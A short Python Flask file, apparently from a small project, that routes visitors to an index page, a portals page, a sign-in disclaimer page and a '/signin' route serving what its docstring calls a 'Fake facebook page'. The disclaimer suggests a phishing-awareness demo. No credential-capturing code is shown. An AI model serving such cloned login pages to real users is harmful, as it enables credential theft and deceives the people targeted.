"""Our script for dynamic page serving."""

from flask import Flask, render_template
import requests


app = Flask("ZADZ")


@app.route("/")
@app.route("/index")
def index():
    """Index page."""
    return render_template("index.html")


@app.route("/portals", methods=['GET'])
def portals():
    """Portal."""
    return render_template("portals.html")


@app.route("/phishing", methods=['GET'])
def phishing():
    """Sign-in disclaimer."""
    return render_template("phishing.html")


@app.route("/signin", methods=['GET'])
def signin():
    """Fake facebook page."""
    return render_template("facebookClone.htm")
